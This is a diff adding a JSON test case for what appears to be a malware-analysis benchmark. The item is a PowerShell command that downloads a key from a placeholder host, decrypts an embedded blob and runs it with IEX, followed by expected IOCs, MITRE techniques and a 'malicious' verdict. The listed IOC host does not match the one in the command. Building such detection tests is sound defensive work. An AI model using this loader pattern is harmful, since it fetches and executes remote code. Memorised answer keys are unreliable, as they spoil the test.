@@ -1,0 +1,41 @@
+{
+  "id": "c2-derived-key-2",
+  "category": "ps-crypto",
+  "algorithm": "AES-CBC",
+  "command_line": "$k = (New-Object Net.WebClient).DownloadString('http://benchmark.example/keys.txt'); $c = [Convert]::FromBase64String('Q1RYXzI='); $aes = [System.Security.Cryptography.Aes]::Create(); $aes.Key = [Convert]::FromBase64String($k); $aes.IV = New-Object byte[] 16; $aes.Mode = 'CBC'; $dec = $aes.CreateDecryptor(); $plain = $dec.TransformFinalBlock($c, 0, $c.Length); IEX ([Text.Encoding]::UTF8.GetString($plain))",
+  "stage_ladder": [
+    {
+      "name": "http-request-key-fetch",
+      "recoverable": false,
+      "reason": "Key is fetched at runtime from C2 \u2014 no static recovery possible."
+    },
+    {
+      "name": "base64-decode-cipher",
+      "recoverable": true,
+      "reason": ""
+    },
+    {
+      "name": "aes-cbc-decrypt",
+      "recoverable": false,
+      "reason": "Requires C2-fetched key."
+    }
+  ],
+  "key_status": "c2-derived",
+  "expected_plaintext": null,
+  "expected_iocs": [
+    "http://n1x.io/keys.txt"
+  ],
+  "expected_lolbins": [
+    "powershell.exe"
+  ],
+  "expected_mitre": [
+    "T1027",
+    "T1071.001",
+    "T1140"
+  ],
+  "expected_verdict": "malicious",
+  "expected_confidence_min": 0.8,
+  "notes": "C2-fetched key \u2014 runtime-only decryption.",
+  "source": "nivxray-rc41-crypto",
+  "license": "CC-BY-4.0"
+}
